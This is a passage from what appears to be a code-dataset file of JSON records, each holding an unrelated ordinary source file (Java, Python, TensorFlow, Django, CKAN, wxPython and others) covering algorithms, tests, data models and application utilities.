numsSameConsecDiff(int N, int K) {\n        if (N == 1) return new int[]{0, 1, 2, 3, 4, 5, 6, 7, 8, 9};\n        List<Integer> result = new ArrayList<>();\n        for (int i = 1; i < 10; i++) \n            dfs(N, K, 1, i, result);\n        int[] ans = new int[result.size()];\n        for (int i = 0; i < ans.length; i++) \n            ans[i] = result.get(i);\n        return ans;\n    }\n    \n    private void dfs(int N, int K, int index, int num, List<Integer> result) {\n        if (index == N) {\n            result.add(num);\n            return;\n        }\n        \n        int pre = num % 10;\n        if (pre + K >= 0 && pre + K <= 9) {\n            dfs(N, K, index + 1, num * 10 + pre + K, result);\n        }\n        if (pre - K >= 0 && pre - K <= 9) {\n            if (K == 0) return;\n            dfs(N, K, index + 1, num * 10 + pre - K, result);\n        }\n        return;\n    }\n}\n\n'''\n"}
{"text": "# -*- coding: utf-8 -*-\n\n\"\"\"\ntablib.compat\n~~~~~~~~~~~~~\n\nTablib compatiblity module.\n\n\"\"\"\n\nimport sys\n\nis_py3 = (sys.version_info[0] > 2)\n\n\n\ntry:\n    from collections import OrderedDict\nexcept ImportError:\n    from tablib.packages.ordereddict import OrderedDict\n\n\nif is_py3:\n    from io import BytesIO\n    import tablib.packages.xlwt3 as xlwt\n    from tablib.packages import markup3 as markup\n    from tablib.packages import openpyxl3 as openpyxl\n    from tablib.packages.odf3 import opendocument, style, text, table\n\n    import csv\n    from io import StringIO\n    # py3 mappings\n\n    unicode = str\n    bytes = bytes\n    basestring = str\n\nelse:\n    from cStringIO import StringIO as BytesIO\n    from cStringIO import StringIO\n    import tablib.packages.xlwt as xlwt\n    import tablib.packages.xlrd as xlrd\n    from tablib.packages import markup\n    from itertools import ifilter\n    from tablib.packages import openpyxl\n    from tablib.packages.odf import opendocument, style, text, table\n\n    from tablib.packages import unicodecsv as csv\n\n    unicode = unicode"}
{"text": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom flask_restplus import fields\nfrom app import api\n\n\nhost_stats_fields_attributes = api.model('HostStats', {\n    'uptime': fields.Nested(api.model('HostUptime', {\n        'days': fields.Integer,\n        'hours': fields.Integer,\n        'minutes': fields.Integer,\n        'seconds': fields.Integer,\n        'total_seconds': fields.Integer\n    })),\n    'hostname': fields.String,\n    'distrib': fields.String,\n    'disk': fields.Nested(api.model('HostDiskUsage', {\n        'name': fields.String,\n        'total': fields.Integer,\n        'used': fields.Integer,\n        'free': fields.Integer,\n        'percent': fields.Float\n    }), as_list=True),\n    'cpu': fields.Nested(api.model('HostCpuUsage', {\n        'usage': fields.Float,\n        'model': fields.String,\n        'logical': fields.Integer,\n        'physical': fields.Integer\n    })),\n    'memory': fields.Nested(api.model('HostMemoryUsage', {\n        'virtual': fields.Nested(api.model('HostMemoryVirtual', {\n            'total': fields.Integer,\n            'percent': fields.Float,\n            'free': fields.Integer,\n            'used': fields.Integer\n        })),\n        'swap': fields.Nested(api.model('HostMemorySwap', {\n            'total': fields.Integer,\n            'percent': fields.Float,\n            'free': fields.Integer,\n            'used': fields.Integer\n        }))\n    })),\n    'kernel': fields.String,\n    'lxc': fields.Nested(api.model('LXC', {\n        'version': fields.String,\n        'lxcpath': fields.String,\n        'default_config': fields.String\n    }))\n})\n\n_host_stats_fields_get = api.model('HostStatsFieldsGet', {\n    'type': fields.String(default='stats'),\n    'attributes': fields.Nested(host_stats_fields_attributes),\n    'id': fields.Integer(default=1)\n})\n\n\nhost_stats_fields_get = api.model('HostStatsRootGet', { 'data': fields.Nested(_host_stats_fields_get) })\n\n\nhost_reboot_fields_post = api.model('HostRebootModelPost', {\n    'message': fields.String\n})\n"}
{"text": "#\n# $Id$\n#\n# Description\n#   Runs the same tests, but does it by using the Python language bindings.\n#   The Python bindings need to be be built and installed to run this.\n#\n# Copyright 2010 Dan Rinehimer\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport libjxtl;\nimport glob;\nimport os.path;\nimport filecmp;\n\ndef format_case( value, format, context ):\n    if ( format == \"upper\" ):\n        return value.upper();\n    elif ( format == \"lower\" ):\n        return value.lower();\n    else:\n        return value;\n\ndef compare( file1, file2 ):\n    if ( filecmp.cmp( file1, file2 ) == False ):\n        print \"Failed test in \" + os.path.dirname( file1 );\n    else:\n        os.remove( file2 );\n\ninputs = glob.glob( \"./t*/input\" );\nbeers_xml = libjxtl.xml_to_dict( \"t.xml\" );\nbeers_json = libjxtl.json_to_dict( \"t.json\" );\nt = libjxtl.Template();\n\nfor input in inputs:\n    dir = os.path.dirname( input );\n    t.load( input );\n    t.register_format( \"upper\", format_case );\n    t.register_format( \"lower\", format_case );\n    t.expand_to_file( dir + \"/test.output\", beers_xml );\n    compare( dir + \"/output\", dir + \"/test.output\" );\n    t.expand_to_file( dir + \"/test.output\", beers_json );\n    compare( dir + \"/output\", dir + \"/test.output\" );\n"}
{"text": "import tensorflow as tf\n\n\n# How often to update smoothed variables (in terms of training steps).\nDEFAULT_UPDATE_FREQUENCY = 5\n\n\nclass ExponentialSmoothing(object):\n    \"\"\"Defines TensorFlow variables and operations for exponential smoothing.\n\n    Following Marian [1], we maintain smoothed versions of all trainable\n    variables. This class creates the smoothed variables (assuming that the\n    model has already been initialized) and provides operations that can be\n    run to update the variables and to interchange the values of the raw and\n    the smoothed variables (which can be used to swap-in the smoothed versions\n    for validation, for instance).\n\n    Ideally, the smoothed variables would be updated after every training step,\n    but in practice that introduces a noticeable overhead (around 20%)\n    due to the need to transfer tensor values from GPU memory into CPU memory.\n    Instead we allow updating after every N steps by increasing the smoothing\n    factor accordingly. The default N=5 seems to be a good compromise.\n\n    [1]\n     \"Marian: Fast Neural Machine Translation in C++\",\n     Junczys-Dowmunt et al., in Proceedings of ACL 2018, System Demonstrations.\n    \"\"\"\n\n    def __init__(self, smoothing_factor,\n                 update_frequency=DEFAULT_UPDATE_FREQUENCY):\n        \"\"\"Creates TF variables and operations.\n\n        Args:\n            smoothing_factor: float controlling weight of past vs new values.\n            update_frequency: integer indicating how often updates will occur.\n        \"\"\"\n        self._update_frequency = update_frequency\n        adjusted_smoothing_factor = smoothing_factor * update_frequency\n        # Smoothed variables are stored in CPU memory to avoid eating into\n        # valuable GPU memory.\n        device_spec = tf.DeviceSpec(device_type=\"CPU\", device_index=0)\n        with tf.device(device_spec):\n            # Create variables to hold the smoothed versions of all trainable\n            # variables.\n            smooth_vars = {}\n            for v in tf.compat.v1.trainable_variables():\n                assert v.name[-2:] == \":0\"\n                name = v.name[:-2] + \"_smooth\"\n                s = tf.compat.v1.get_variable(name=name,\n                                    initializer=tf.zeros_like(v),\n                                    trainable=False,\n                                    use_resource=True)\n                smooth_vars[v.name] = s\n            # Define the ops to update the smoothed variables.\n            self._update_ops = []\n            for v in tf.compat.v1.trainable_variables():\n                s = smooth_vars[v.name]\n                updated_s = (1 - adjusted_smoothing_factor) * s \\\n                            + adjusted_smoothing_factor * v\n                self._update_ops += [tf.compat.v1.assign(s, updated_s)]\n            # Define the ops to swap the raw and smoothed variables.\n            self._swap_ops = []\n            for v in tf.compat.v1.trainable_variables():\n                s = smooth_vars[v.name]\n                v_value = v.read_value()\n                s_value = s.read_value()\n                with tf.control_dependencies([v_value, s_value]):\n                    self._swap_ops += [v.assign(s_value)]\n                    self._swap_ops += [s.assign(v_value)]\n\n    @property\n    def update_ops(self):\n        return self._update_ops\n\n    @property\n    def swap_ops(self):\n        return self._swap_ops\n\n    @property\n    def update_frequency(self):\n        return self._update_frequency\n"}
{"text": "# Copyright \u00a9 2014-2016 Jakub Wilk <jwilk@jwilk.net>\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \u201cSoftware\u201d), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in\n# all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \u201cAS IS\u201d, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n\nfrom nose.tools import (\n    assert_equal,\n    assert_greater_equal,\n)\n\nimport lib.text as M\n\ndef test_ltrim():\n    def t(s, n, expected):\n        result = M.ltrim(s, n)\n        assert_greater_equal(\n            max(1, n),\n            len(result)\n        )\n        assert_equal(result, expected)\n    truncations = [\n        '\u2026',\n        '\u2026',\n        '\u2026s',\n        '\u2026gs',\n        'eggs',\n        'eggs',\n    ]\n    for n, s in enumerate(truncations):\n        t(truncations[-1], n, s)\n\ndef test_rtrim():\n    def t(s, n, expected):\n        result = M.rtrim(s, n)\n        assert_equal(result, expected)\n    truncations = [\n        '\u2026',\n        '\u2026',\n        'e\u2026',\n        'eg\u2026',\n        'eggs',\n        'eggs',\n    ]\n    for n, s in enumerate(truncations):\n        t(truncations[-1], n, s)\n\n# vim:ts=4 sts=4 sw=4 et\n"}
{"text": "from __future__ import print_function\nfrom ecl.util.util import IntVector\nfrom res.enkf.enums import ErtImplType\nfrom res.enkf.data import EnkfNode\nfrom ert_gui.shell import assertConfigLoaded, ErtShellCollection\nfrom ert_gui.shell.libshell import autoCompleteList, splitArguments\n\n\nclass Export(ErtShellCollection):\n    DEFAULT_EXPORT_PATH = \"export/%s/%s_%%d\"\n\n    def __init__(self, parent):\n        super(Export, self).__init__(\"export\", parent)\n        default_path = Export.DEFAULT_EXPORT_PATH % (\"{KEY}\", \"{KEY}\")\n\n        self.addShellFunction(name=\"FIELD\",\n                              function=Export.exportFIELD,\n                              completer=Export.completeFIELD,\n                              help_arguments=\"<keyword> [%s] [1,4,7-10]\" % default_path,\n                              help_message=\"Export parameters; path and realisations in [...] are optional.\")\n\n    def supportedFIELDKeys(self):\n        ens_config = self.ert().ensembleConfig()\n        key_list = ens_config.getKeylistFromImplType(ErtImplType.FIELD)\n        return key_list\n\n    @assertConfigLoaded\n    def completeFIELD(self, text, line, begidx, endidx):\n        arguments = splitArguments(line)\n\n        if len(arguments) > 2 or len(arguments) == 2 and not text:\n            return []\n\n        return autoCompleteList(text, self.supportedFIELDKeys())\n\n    @assertConfigLoaded\n    def exportFIELD(self, line):\n        arguments = splitArguments(line)\n\n        if len(arguments) >= 1:\n            ens_config = self.ert().ensembleConfig()\n            key = arguments[0]\n            if key in self.supportedFIELDKeys():\n                config_node = ens_config[key]\n                if len(arguments) >= 2:\n                    path_fmt = arguments[1]\n                else:\n                    path_fmt = Export.DEFAULT_EXPORT_PATH % (key, key) + \".grdecl\"\n\n                if len(arguments) >= 3:\n                    range_string = \"\".join(arguments[2:])\n                    iens_list = IntVector.active_list(range_string)\n                else:\n                    ens_size = self.ert().getEnsembleSize()\n                    iens_list = IntVector.createRange(0, ens_size, 1)\n\n                fs_manager = self.ert().getEnkfFsManager()\n                fs = fs_manager.getCurrentFileSystem()\n                mc = self.ert().getModelConfig()\n                init_file = config_node.getInitFile(mc.getRunpathFormat())\n                if init_file:\n                    print('Using init file: %s' % init_file)\n\n                EnkfNode.exportMany(config_node, path_fmt, fs, iens_list, arg=init_file)\n            else:\n                self.lastCommandFailed(\"No such FIELD node: %s\" % key)\n        else:\n            self.lastCommandFailed(\"Expected at least one argument: <keyword> received: '%s'\" % line)\n"}
{"text": "# coding=utf-8\n\n\ndef global_survived(kp, demands):\n    s = 0\n    for K in kp:\n        if len(K) == len(demands):\n            s += 1\n    return s / float(len(kp))\n\n\ndef survived_dem(kp):\n    sk = []\n    for k in kp:\n        sk.append(len(k))\n    return sk\n\n\ndef failed_dem(kp, demands):\n    fk = []\n    for k in kp:\n        fk.append(len(demands) - len(k))\n    return fk\n\n\ndef dem_survival(kp, demands):\n    dem_s = []\n    for k in range(demands):\n        gss = []\n        for g_i in range(kp):\n            if k in kp[g_i]:\n                gss.append(g_i)\n        dem_s.append(gss)\n    return dem_s\n\n\ndef compute_dem_av(Kp, demands, scenarios, scenarios_p):\n    dem_av = []\n    for k in range(len(demands)):\n        k_p = 0\n        for g_i in range(scenarios):\n            if k not in Kp[g_i]:\n                k_p += scenarios_p[g_i]\n        dem_av.append(1 - k_p)\n    return dem_av\n\n\ndef print_scenario(graph, scenario, scenario_p=None, scenario_rep=None, e_lbl='label'):\n    print(\"----------------------------------------------------------------\")\n    if scenario_rep:\n        print(\"Physical cuts that generates this scenario: %d\"%scenario_rep)\n    if scenario_p:\n        print(\"Happening probability of this scenario: \" % scenario_p)\n\n    print(\"Failed links: \")\n    for e_i in scenario:\n        print(\"        \", graph.es[e_i][e_lbl])\n    print(\"----------------------------------------------------------------\")"}
{"text": "#!/usr/bin/env python\n\n# Script to print out scaled quadrupole entries for a list of atom types (user-dfeined)\n\nimport sys\n\nif len(sys.argv) < 3:\n  print \"Usage = scale_OH.py [FILENAME] [ATOM TYPES]\"\n\n# Read in input file and atom types\ninfile = sys.argv[1]\nattypes = []\nfor i in sys.argv[2:]:\n  attypes.append(int(i))\n\n# I/O files\nfi = open(infile,'r')\nfo = open(\"scaled_OH.txt\",'w')\n\n# Read in inpult file sequentially\nwhile True:\n  line = fi.readline()\n  if not line: break\n\n  # Search for multipole lines and append to list\n  if line.find(\"multipole\") > -1:\n    multipole_lines = [line]\n    i=1\n    while i < 5:\n      line = fi.readline()\n      multipole_lines.append(line)\n      i = i+1\n#   Match up multipoles to scale\n    if int(multipole_lines[0].split()[1]) in attypes:\n      fo.write(multipole_lines[0])\n      fo.write(multipole_lines[1])\n#     Scale OH quadrupoles\n      xx = float(multipole_lines[2].split()[0]) * 0.6\n      xy = float(multipole_lines[3].split()[0]) * 0.6\n      yy = float(multipole_lines[3].split()[1]) * 0.6\n      xz = float(multipole_lines[4].split()[0]) * 0.6\n      yz = float(multipole_lines[4].split()[1]) * 0.6\n      zz = float(multipole_lines[4].split()[2]) * 0.6\n#     Print OH quadrupoles\n      fo.write(\"%47.5f\\n\" % xx)\n      fo.write(\"%47.5f %10.5f\\n\" % (xy,yy))\n      fo.write(\"%47.5f %10.5f %10.5f\\n\" % (xz,yz,zz))\n\n\nfi.close()\nfo.close()\nprint \"Scaling complete, printed out in scaled_OH.txt\"\nprint \"Substitute this for your existing multipoles\"\n"}
{"text": "import ckan.plugins as plugins\nimport ckan.plugins.toolkit as toolkit\nfrom ckan.plugins.toolkit import asbool\nimport jieba\nimport jieba.analyse\nfrom ckan.plugins.toolkit import request, c\nimport pylons.config as config\nimport opencc\n\nclass Data_RecommendationPlugin(plugins.SingletonPlugin):\n    plugins.implements(plugins.IConfigurer)\n    plugins.implements(plugins.ITemplateHelpers)\n    plugins.implements(plugins.IRoutes, inherit=True)\n\n    # IConfigurer\n\n    def update_config(self, config_):\n        toolkit.add_template_directory(config_, 'templates')\n        toolkit.add_public_directory(config_, 'public')\n        toolkit.add_resource('fanstatic', 'data_recommendation')\n\n\n    @classmethod\n    def related_pkgs(cls):\n        # Parameter\n        extractNum = int(config.get('ckan.data_recommended.extract_num', '5'))\n        byTag = asbool(config.get('ckan.data_recommended.by_tag', 'true'))\n        byTitle = asbool(config.get('ckan.data_recommended.by_title', 'true'))\n\n        # fetch pkg info\n        pkg_name = request.environ['PATH_INFO'].split('/')[-1]\n        pkg_title = toolkit.get_action('package_show')({}, {'id':pkg_name})['title']\n        pkg_title_s = opencc.convert(pkg_title, config='zhtw2zhcn_s.ini')\n        pkg_tags = [pkg_tag['name'] for pkg_tag in toolkit.get_action('package_show')({}, {'id':pkg_name})['tags']]\n\n         # related_tag_titles\n        related_tag_titles = set()\n        if byTag:\n            related_tag_titles.update(set(pkg_tags))\n\n        if byTitle:\n            tmp = jieba.analyse.extract_tags(pkg_title_s, topK=extractNum)\n            related_tag_titles.update(\n                set(\n                    (opencc.convert(_, config='zhs2zhtw_vp.ini') for _ in tmp)\n                )\n            )\n\n        related_pkgs = {}\n\n        related_pkgs['results'] = dict()\n        for related_tag_title in related_tag_titles:\n            tmp = toolkit.get_action('package_search')({}, {'q': '\"'+related_tag_title+'\"', 'rows': 20})\n            related_pkg_results = tmp['results']\n            related_pkgs['results'][related_tag_title] = dict()\n\n            related_pkgs['results'][related_tag_title]['rows'] =  tmp['count']\n\n            # filte the same title\n            related_pkg_results = [_ for _ in related_pkg_results if _['title'] != pkg_title]\n            related_pkgs['results'][related_tag_title]['result'] =  related_pkg_results\n\n        # related_pkgs['results'][related_tag_title] = sorted(related_pkgs['results'][related_tag_title], key=lambda t: len(t))\n        return related_pkgs\n\n    def get_helpers(self):\n        return {'related_pkgs': self.related_pkgs}"}
{"text": "\"\"\"\nEnsure we can write to Vertica data sources.\n\"\"\"\nfrom __future__ import absolute_import\n\nimport textwrap\nfrom unittest import TestCase\n\nimport luigi\nimport luigi.task\nfrom mock import MagicMock, patch, sentinel\n\nfrom edx.analytics.tasks.util.tests.target import FakeTarget\nfrom edx.analytics.tasks.warehouse.run_vertica_sql_script import RunVerticaSqlScriptTask\n\n\nclass RunVerticaSqlScriptTaskTest(TestCase):\n    \"\"\"\n    Ensure we can connect to and write data to Vertica data sources.\n    \"\"\"\n\n    def setUp(self):\n        patcher = patch('edx.analytics.tasks.util.vertica_target.vertica_python.vertica')\n        self.mock_vertica_connector = patcher.start()\n        self.addCleanup(patcher.stop)\n\n    def create_task(self, credentials=None):\n        \"\"\"\n        Emulate execution of a generic RunVerticaSqlScriptTask.\n        \"\"\"\n        # Make sure to flush the instance cache so we create a new task object.\n        luigi.task.Register.clear_instance_cache()\n        task = RunVerticaSqlScriptTask(\n            credentials=sentinel.ignored,\n            script_name='my simple script',\n            source_script=sentinel.ignored,\n        )\n\n        if not credentials:\n            credentials = '''\\\n                {\n                    \"host\": \"db.example.com\",\n                    \"port\": 5433,\n                    \"user\": \"exampleuser\",\n                    \"password\": \"example password\"\n                }'''\n\n        # This SQL doesn't actually run, but I've used real SQL to provide context. :)\n        source = '''\n        DELETE TABLE my_schema.my_table;\n        CREATE TABLE my_schema.my_table AS SELECT foo, bar, baz FROM my_schema.another_table;\n        '''\n\n        fake_input = {\n            'credentials': FakeTarget(value=textwrap.dedent(credentials)),\n            'source_script': FakeTarget(value=textwrap.dedent(source))\n        }\n\n        fake_output = MagicMock(return_value=self.mock_vertica_connector)\n        self.mock_vertica_connector.marker_schema = \"name_of_marker_schema\"\n        self.mock_vertica_connector.marker_table = \"name_of_marker_table\"\n\n        task.input = MagicMock(return_value=fake_input)\n        task.output = fake_output\n        return task\n\n    def test_run_with_default_credentials(self):\n        self.create_task(credentials='{}').run()\n\n    def test_run(self):\n        self.create_task().run()\n        mock_conn = self.mock_vertica_connector.connect()\n        self.assertTrue(mock_conn.cursor().execute.called)\n        self.assertFalse(mock_conn.rollback.called)\n        self.assertTrue(mock_conn.commit.called)\n        self.assertTrue(mock_conn.close.called)\n\n    def test_run_with_failure(self):\n        task = self.create_task()\n        task.output().touch = MagicMock(side_effect=Exception(\"Failed to update marker\"))\n        with self.assertRaises(Exception):\n            task.run()\n        mock_conn = self.mock_vertica_connector.connect()\n        self.assertTrue(mock_conn.cursor().execute.called)\n        self.assertTrue(mock_conn.rollback.called)\n        self.assertFalse(mock_conn.commit.called)\n        self.assertTrue(mock_conn.close.called)\n"}
{"text": "# -*- coding: utf-8 -*-\n\n#   Copyright (c) 2010-2016, MIT Probabilistic Computing Project\n#\n#   Licensed under the Apache License, Version 2.0 (the \"License\");\n#   you may not use this file except in compliance with the License.\n#   You may obtain a copy of the License at\n#\n#       http://www.apache.org/licenses/LICENSE-2.0\n#\n#   Unless required by applicable law or agreed to in writing, software\n#   distributed under the License is distributed on an \"AS IS\" BASIS,\n#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n#   See the License for the specific language governing permissions and\n#   limitations under the License.\n\nimport argparse\nimport os\n\nimport bayeslite\nfrom bayeslite.backends.cgpm_backend import CGPM_Backend\nimport bayeslite.shell.core as shell\nimport bayeslite.shell.hook as hook\n\n\ndef parse_args(argv):\n    parser = argparse.ArgumentParser()\n    parser.add_argument('bdbpath', type=str, nargs='?', default=None,\n                        help=\"bayesdb database file\")\n    parser.add_argument('-j', '--jobs', type=int, default=1,\n                        help=\"Max number of jobs (processes) useable.\")\n    parser.add_argument('-s', '--seed', type=int, default=None,\n                        help=\"Random seed for the default generator.\")\n    parser.add_argument('-f', '--file', type=str, nargs=1, default=None,\n                        help=\"Path to commands file. May be used to specify a \"\n                        \"project-specific init file.\")\n    parser.add_argument('-b', '--batch', action='store_true',\n                        help=\"Exit after executing file specified with -f.\")\n    parser.add_argument('-q', '--no-init-file', action='store_true',\n                        help=\"Do not load ~/.bayesliterc\")\n    parser.add_argument('-m', '--memory', action='store_true',\n                        help=\"Use temporary database not saved to disk\")\n\n    args = parser.parse_args(argv)\n    return args\n\n\ndef run(stdin, stdout, stderr, argv):\n    args = parse_args(argv[1:])\n    progname = argv[0]\n    slash = progname.rfind('/')\n    if slash:\n        progname = progname[slash + 1:]\n    if args.bdbpath is None and not args.memory:\n        stderr.write('%s: pass filename or -m/--memory\\n' % (progname,))\n        return 1\n    if args.bdbpath == '-':\n        stderr.write('%s: missing option?\\n' % (progname,))\n        return 1\n    bdb = bayeslite.bayesdb_open(pathname=args.bdbpath,\n        builtin_backends=False)\n\n    multiprocess = args.jobs != 1\n    backend = CGPM_Backend(cgpm_registry={}, multiprocess=multiprocess)\n    bayeslite.bayesdb_register_backend(bdb, backend)\n    bdbshell = shell.Shell(bdb, 'cgpm', stdin, stdout, stderr)\n    with hook.set_current_shell(bdbshell):\n        if not args.no_init_file:\n            init_file = os.path.join(os.path.expanduser('~/.bayesliterc'))\n            if os.path.isfile(init_file):\n                bdbshell.dot_read(init_file)\n\n        if args.file is not None:\n            for path in args.file:\n                if os.path.isfile(path):\n                    bdbshell.dot_read(path)\n                else:\n                    bdbshell.stdout.write('%s is not a file.  Aborting.\\n' %\n                        (str(path),))\n                    break\n\n        if not args.batch:\n            bdbshell.cmdloop()\n    return 0\n\n\ndef main():\n    import sys\n    sys.exit(run(sys.stdin, sys.stdout, sys.stderr, sys.argv))\n\nif __name__ == '__main__':\n    main()\n"}
{"text": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import migrations, models\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='Account',\n            fields=[\n                ('id', models.AutoField(serialize=False, auto_created=True, verbose_name='ID', primary_key=True)),\n                ('password', models.CharField(max_length=128, verbose_name='password')),\n                ('last_login', models.DateTimeField(null=True, blank=True, verbose_name='last login')),\n                ('email', models.EmailField(unique=True, max_length=254)),\n                ('name', models.CharField(max_length=50)),\n                ('is_admin', models.BooleanField(default=False)),\n                ('created_at', models.DateTimeField(auto_now_add=True)),\n                ('updated_at', models.DateTimeField(auto_now=True)),\n            ],\n            options={\n                'verbose_name_plural': 'Accounts',\n            },\n        ),\n    ]\n"}
{"text": "# -*- coding: utf-8 -*-\nfrom .helpers import (\n    User, check_allow_for_user, check_allow_for_uri, is_authenticated,\n)\n\ntry:\n    from django.utils.deprecation import MiddlewareMixin\nexcept ImportError:\n    MiddlewareMixin = object  # fallback for Django < 1.10\n\n\nclass ImpersonateMiddleware(MiddlewareMixin):\n    def process_request(self, request):\n        request.user.is_impersonate = False\n        request.impersonator = None\n\n        if is_authenticated(request.user) and \\\n           '_impersonate' in request.session:\n            new_user_id = request.session['_impersonate']\n            if isinstance(new_user_id, User):\n                # Edge case for issue 15\n                new_user_id = new_user_id.pk\n\n            try:\n                new_user = User.objects.get(pk=new_user_id)\n            except User.DoesNotExist:\n                return\n\n            if check_allow_for_user(request, new_user) and \\\n               check_allow_for_uri(request.path):\n                request.impersonator = request.user\n                request.user = new_user\n                request.user.is_impersonate = True\n\n        request.real_user = request.impersonator or request.user\n"}
{"text": "import pathlib\n\nimport supriya.osc\nfrom supriya.commands.Request import Request\nfrom supriya.commands.RequestBundle import RequestBundle\nfrom supriya.enums import RequestId\n\n\nclass SynthDefLoadDirectoryRequest(Request):\n    \"\"\"\n    A /d_loadDir request.\n    \"\"\"\n\n    ### CLASS VARIABLES ###\n\n    __slots__ = (\"_callback\", \"_directory_path\")\n\n    request_id = RequestId.SYNTHDEF_LOAD_DIR\n\n    ### INITIALIZER ###\n\n    def __init__(self, callback=None, directory_path=None):\n        Request.__init__(self)\n        if callback is not None:\n            assert isinstance(callback, (Request, RequestBundle))\n        self._callback = callback\n        self._directory_path = pathlib.Path(directory_path).absolute()\n\n    ### PUBLIC METHODS ###\n\n    def to_osc(self, *, with_placeholders=False, with_request_name=False):\n        if with_request_name:\n            request_id = self.request_name\n        else:\n            request_id = int(self.request_id)\n        contents = [request_id, str(self.directory_path)]\n        if self.callback:\n            contents.append(\n                self.callback.to_osc(\n                    with_placeholders=with_placeholders,\n                    with_request_name=with_request_name,\n                )\n            )\n        message = supriya.osc.OscMessage(*contents)\n        return message\n\n    ### PUBLIC PROPERTIES ###\n\n    @property\n    def callback(self):\n        return self._callback\n\n    @property\n    def response_patterns(self):\n        return [\"/done\", \"/d_loadDir\"], None\n\n    @property\n    def directory_path(self):\n        return self._directory_path\n"}
{"text": "import os\n\nimport wx\nfrom PIL import Image\n\nfrom vistas.core.graphics.overlay import BasicOverlayButton\nfrom vistas.core.paths import get_resources_directory\nfrom vistas.ui.events import CameraSelectModeEvent\n\n\nclass GLSelectionControls(wx.EvtHandler):\n    \"\"\" Event handler for initiating selection interaction \"\"\"\n\n    BOX = 'box'\n    POLY = 'poly'\n    CONFIRM = 'confirm'\n    CANCEL = 'cancel'\n\n    def __init__(self, gl_canvas, camera):\n        super().__init__()\n\n        self.camera = camera\n        self.canvas = gl_canvas\n        self.visible = False\n        self.optional_buttons_visible = False\n        self.last_mode = None\n\n        self.box_select_button = BasicOverlayButton(self._resize('glyphicons-95-vector-path-square.png'), (0, 0))\n        self.box_select_button.Bind(wx.EVT_BUTTON, lambda event: self.set_mode(self.BOX))\n        self.poly_select_button = BasicOverlayButton(self._resize('glyphicons-97-vector-path-polygon.png'), (0, 0))\n        self.poly_select_button.Bind(wx.EVT_BUTTON, lambda event: self.set_mode(self.POLY))\n        self.cancel_button = BasicOverlayButton(self._resize('glyphicons-193-remove-sign.png'), (0, 0))\n        self.cancel_button.Bind(wx.EVT_BUTTON, lambda event: self.set_mode(self.CANCEL))\n        self.confirm_button = BasicOverlayButton(self._resize('glyphicons-194-ok-sign.png'), (0, 0))\n        self.confirm_button.Bind(wx.EVT_BUTTON, lambda event: self.set_mode(self.CONFIRM))\n\n        self.reposition()\n        self.show()\n\n        self.canvas.Bind(wx.EVT_SIZE, lambda event: self.reposition())\n\n    @staticmethod\n    def _resize(path) -> Image:\n        return Image.open(os.path.join(get_resources_directory(), 'images', path)).resize((25, 25))\n\n    def reposition(self):\n        size = self.canvas.GetSize()\n        width = size.width\n        height = size.height // 3\n        y_offset = 0\n        buttons = (self.box_select_button, self.poly_select_button, self.cancel_button, self.confirm_button)\n\n        for button in buttons:\n            button.position = (width - button.size[0], height + y_offset)\n            y_offset += 5 + button.size[1]\n\n        self.canvas.Refresh()\n\n    def show_optional_buttons(self):\n        if not self.optional_buttons_visible:\n            self.canvas.overlay.add_button(self.cancel_button)\n            self.canvas.overlay.add_button(self.confirm_button)\n            self.optional_buttons_visible = True\n\n    def hide_optional_buttons(self):\n        if self.optional_buttons_visible:\n            self.canvas.overlay.remove_button(self.cancel_button)\n            self.canvas.overlay.remove_button(self.confirm_button)\n            self.optional_buttons_visible = False\n\n    def show(self):\n        if not self.visible:\n            self.canvas.overlay.add_button(self.box_select_button)\n            self.canvas.overlay.add_button(self.poly_select_button)\n            if self.last_mode in (self.BOX, self.POLY):\n                self.show_optional_buttons()\n\n        self.visible = True\n\n    def hide(self):\n        if self.visible:\n            self.canvas.overlay.remove_button(self.box_select_button)\n            self.canvas.overlay.remove_button(self.poly_select_button)\n            self.hide_optional_buttons()\n\n        self.visible = False\n\n    def set_mode(self, mode):\n        wx.PostEvent(self.canvas, CameraSelectModeEvent(mode=mode))\n"}
